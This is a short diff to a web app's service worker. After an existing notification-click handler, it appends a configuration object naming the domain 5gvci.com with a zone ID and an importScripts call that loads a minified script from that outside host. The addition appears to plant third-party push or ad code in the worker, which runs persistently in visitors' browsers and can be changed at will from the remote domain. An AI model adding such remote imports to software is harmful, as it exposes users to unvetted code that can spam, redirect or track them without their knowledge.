@@ -109,3 +109,11 @@ self.addEventListener("notificationclick", (event) => {
 
   event.waitUntil(clients.openWindow(event.notification.data));
 });
+
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10580884
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+
